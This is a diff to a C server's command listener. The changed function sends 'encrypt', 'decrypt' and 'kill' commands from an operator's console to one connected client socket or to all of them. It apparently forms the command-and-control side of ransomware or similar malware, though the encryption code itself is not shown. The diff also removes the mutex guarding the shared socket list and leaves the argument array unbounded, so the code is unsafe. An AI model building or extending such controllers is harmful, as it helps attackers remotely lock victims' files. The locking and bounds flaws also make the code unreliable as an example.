@@ -52,7 +52,7 @@ void *commands_listener(void *arg) {
     while (true) {
         fgets(command, sizeof(command), stdin);
 
-        char *arguments[10];
+        char *arguments[10] = {0};
         int i = 0;
 
         char *token = strtok(command, ";");
@@ -60,20 +60,65 @@ void *commands_listener(void *arg) {
         while (token != NULL) {
             arguments[i] = token;
             i++;
-
-            token = strtok(NULL, ";");
+            token = strtok(NULL, ";\n");
         }
 
         if (strcmp(arguments[0], "list") == 0) {
             get_list();
+        } else if (strcmp(arguments[0], "encrypt") == 0) {
+            if (arguments[1] == NULL) {
+                printf("!!! Use encrypt;client_socket or all\n");
+            } else if (strcmp(arguments[1], "all") == 0) {
+                Node *curr = socket_queue.head;
+                while (curr != NULL) {
+                    send(curr->socketfd, command, strlen(command), 0);
+                    curr = curr->next;
+                }
+            } else {
+                int fd = atoi(arguments[1]);
+                int send_value = send(fd, command, strlen(command), 0);
+                if (send_value == -1) {
+                    printf("client_socket not existing\n");
+                }
+            }
+        } else if (strcmp(arguments[0], "decrypt") == 0) {
+            if (arguments[1] == NULL) {
+                printf("!!! Use decrypt;client_socket or all\n");
+            } else if (strcmp(arguments[1], "all") == 0) {
+                Node *curr = socket_queue.head;
+                while (curr != NULL) {
+                    send(curr->socketfd, command, strlen(command), 0);
+                    curr = curr->next;
+                }
+            } else {
+                int fd = atoi(arguments[1]);
+                int send_value = send(fd, command, strlen(command), 0);
+                if (send_value == -1) {
+                    printf("client_socket not existing\n");
+                }
+            }
+        } else if (strcmp(arguments[0], "kill") == 0) {
+            if (arguments[1] == NULL) {
+                printf("Use kill;client_socket\n");
+            } else if (strcmp(arguments[1], "all") == 0) {
+                Node *curr = socket_queue.head;
+                while (curr != NULL) {
+                    send(curr->socketfd, command, strlen(command), 0);
+                    curr = curr->next;
+                }
+            } else {
+                int fd = atoi(arguments[1]);
+                int send_value = send(fd, command, strlen(command), 0);
+                if (send_value == -1) {
+                    printf("client_socket not existing\n");
+                }
+            }
         } else {
-            pthread_mutex_lock(&socket_queue.lock);
             Node *curr = socket_queue.head;
             while (curr != NULL) {
                 send(curr->socketfd, command, strlen(command), 0);
                 curr = curr->next;
             }
-            pthread_mutex_unlock(&socket_queue.lock);
         }
     } 
 }
